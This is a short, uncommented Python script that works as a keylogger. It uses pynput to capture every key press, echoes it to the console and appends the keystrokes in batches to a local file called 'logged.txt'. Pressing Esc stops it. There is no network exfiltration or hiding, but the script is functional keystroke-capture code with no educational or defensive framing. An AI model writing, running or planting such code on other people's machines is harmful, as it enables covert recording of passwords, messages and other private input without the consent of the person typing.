import pynput

from pynput.keyboard import Key, Listener

count= 0
keys = []

def upon_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 50:
        count = 0
        save_log(keys)
        keys =[]


def upon_release(key):
    if key == Key.esc:
        return False


def save_log(keys):
    with open("logged.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)


with Listener(on_press=upon_press, on_release=upon_release) as listener:
    listener.join()